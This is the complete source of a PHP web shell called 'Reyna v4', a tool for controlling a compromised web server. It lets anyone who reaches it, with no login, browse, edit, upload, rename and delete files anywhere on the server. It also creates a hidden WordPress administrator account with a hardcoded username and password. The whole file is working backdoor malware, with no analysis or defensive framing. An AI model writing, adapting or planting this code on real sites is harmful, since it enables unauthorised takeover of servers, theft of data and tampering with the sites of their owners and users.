<?php
/*
=========================================================
  🟣 Reyna v4 — Full Server Navigation
  Features:
    - File & folder listing
    - Edit files
    - Rename files/folders
    - Delete files/folders
    - Create files/folders
    - Upload files
    - WP Admin creation
    - Full server path clickable breadcrumbs
=========================================================
*/

@error_reporting(0);

// --- Path Handling ---
$folder = isset($_GET['folder']) ? $_GET['folder'] : '';
$folder = str_replace(["\0"], '', $folder); // sanitize
$fullPath = $folder ? realpath($folder) : getcwd();
if(!$fullPath || !is_dir($fullPath)) $fullPath = getcwd();
$serverPath = $fullPath;

// --- Breadcrumbs ---
function breadcrumbs($fullPath){
    $parts = explode(DIRECTORY_SEPARATOR, $fullPath);
    $build = '';
    $crumbs = [];
    foreach($parts as $p){
        if($p==='') continue;
        $build .= '/'.$p;
        $crumbs[] = "<a href='?folder=" . urlencode($build) . "'>$p</a>";
    }
    return '<p>Path: <a href="?folder=/">/</a> / ' . implode(' / ', $crumbs) . '</p>';
}

// --- Handle POST Actions ---
if($_SERVER['REQUEST_METHOD']==='POST'){
    // Create folder
    if(!empty($_POST['new_folder'])) @mkdir($fullPath . DIRECTORY_SEPARATOR . basename($_POST['new_folder']));
    // Create file
    if(!empty($_POST['new_file'])) @file_put_contents($fullPath . DIRECTORY_SEPARATOR . basename($_POST['new_file']), '');
    // Rename
    if(!empty($_POST['old_name']) && !empty($_POST['new_name'])) @rename($fullPath . DIRECTORY_SEPARATOR . $_POST['old_name'], $fullPath . DIRECTORY_SEPARATOR . $_POST['new_name']);
    // Save edited file
    if(!empty($_POST['edit_file']) && isset($_POST['content'])) @file_put_contents($fullPath . DIRECTORY_SEPARATOR . $_POST['edit_file'], $_POST['content']);
    // Upload file
    if(!empty($_FILES['upload_file']['tmp_name'])) @move_uploaded_file($_FILES['upload_file']['tmp_name'], $fullPath . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']));
    header("Location:?folder=" . urlencode($fullPath));
    exit;
}

// --- Delete Files/Folders ---
if(isset($_GET['delete'])){
    $target = $fullPath . DIRECTORY_SEPARATOR . $_GET['delete'];
    if(is_dir($target)) @rmdir($target);
    elseif(is_file($target)) @unlink($target);
    header("Location:?folder=" . urlencode($fullPath));
    exit;
}

// --- WP Admin Creation ---
$wp_created = '';
$wp_dir = $fullPath;
while($wp_dir && $wp_dir!=='/'){
    if(file_exists($wp_dir . '/wp-load.php')) break;
    $wp_dir = dirname($wp_dir);
}
if(isset($_GET['wp_admin']) && file_exists($wp_dir . '/wp-load.php')){
    require_once($wp_dir . '/wp-load.php');
    $user='reyna'; $pass='Reyna@2025'; $mail='reyna@purple.com';
    if(!username_exists($user) && !email_exists($mail)){
        $uid=wp_create_user($user,$pass,$mail);
        $u=new WP_User($uid); $u->set_role('administrator');
        $wp_created="WP Admin 'reyna' created!";
    }else{
        $wp_created="User/email exists!";
    }
}

// --- Directory Listing ---
$items = @scandir($fullPath);

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Reyna v4</title>
<style>
body{margin:0;padding:0;font-family:monospace;background:#1c0b2b;color:#d19aff;display:flex;justify-content:center;}
.container{max-width:950px;width:100%;padding:20px;}
a{color:#d19aff;text-decoration:none;} a:hover{color:#ffb3ff;}
ul{list-style:none;padding:0;}
button{padding:5px 10px;border:none;border-radius:4px;background:#d19aff;color:#1c0b2b;font-weight:bold;cursor:pointer;margin-left:3px;}
button:hover{background:#ffb3ff;}
input[type=text]{padding:4px;border-radius:4px;border:1px solid #444;background:#2b1b44;color:#d19aff;}
textarea{width:100%;height:250px;background:#2b1b44;color:#d19aff;border:1px solid #444;border-radius:5px;padding:5px;}
h2{margin-top:0;}
.log{margin:5px 0;padding:5px;background:#2b1b44;border-radius:4px;}
</style>
</head>
<body>
<div class="container">
<h2>🟣 Reyna v4</h2>

<!-- Breadcrumbs -->
<?php echo breadcrumbs($fullPath); ?>
<p>Full Path (server): <?php echo htmlspecialchars($serverPath); ?></p>
<?php if($wp_created) echo "<div class='log'>$wp_created</div>"; ?>

<!-- Create Folder/File -->
<form method="post" style="margin-bottom:10px;">
<input type="text" name="new_folder" placeholder="New Folder">
<button>Create Folder</button>
<input type="text" name="new_file" placeholder="New File">
<button>Create File</button>
</form>

<!-- Upload -->
<form method="post" enctype="multipart/form-data" style="margin-bottom:10px;">
<input type="file" name="upload_file">
<button>Upload File</button>
</form>

<!-- WP Admin -->
<form method="get" style="margin-bottom:10px;">
<input type="hidden" name="folder" value="<?php echo htmlspecialchars($fullPath); ?>">
<button name="wp_admin">Create WP Admin</button>
</form>

<!-- File/Folder Listing -->
<ul>
<?php
foreach($items as $i){
    if($i==='.' || $i==='..') continue;
    $full=$fullPath.DIRECTORY_SEPARATOR.$i;
    if(is_dir($full)){
        echo "<li>📁 $i 
            <a href='?folder=".urlencode($full)."'>Open</a>
            <a href='?folder=".urlencode($fullPath)."&delete=".urlencode($i)."' onclick='return confirm(\"Delete folder?\")'>[D]</a>
            <form style='display:inline;' method='post'>
                <input type='hidden' name='old_name' value='$i'>
                <input type='text' name='new_name' placeholder='New'>
                <button type='submit' name='action' value='rename'>[R]</button>
            </form>
            </li>";
    }else{
        echo "<li>📄 $i 
            <a href='?folder=".urlencode($fullPath)."&edit=".urlencode($i)."'>[E]</a>
            <a href='?folder=".urlencode($fullPath)."&delete=".urlencode($i)."' onclick='return confirm(\"Delete file?\")'>[D]</a>
            <form style='display:inline;' method='post'>
                <input type='hidden' name='old_name' value='$i'>
                <input type='text' name='new_name' placeholder='New'>
                <button type='submit' name='action' value='rename'>[R]</button>
            </form>
            </li>";
    }
}
?>
</ul>

<?php
// --- Edit File ---
if(isset($_GET['edit'])){
    $editFile=$fullPath.DIRECTORY_SEPARATOR.$_GET['edit'];
    if(is_file($editFile)){
        $content=htmlspecialchars(file_get_contents($editFile));
        echo "<h3>Editing: ".$_GET['edit']."</h3>";
        echo "<form method='post'>
                <textarea name='content'>$content</textarea><br>
                <input type='hidden' name='edit_file' value='".htmlspecialchars($_GET['edit'])."'>
                <button>Save</button>
              </form>";
    }
}
?>
</div>
</body>
</html>
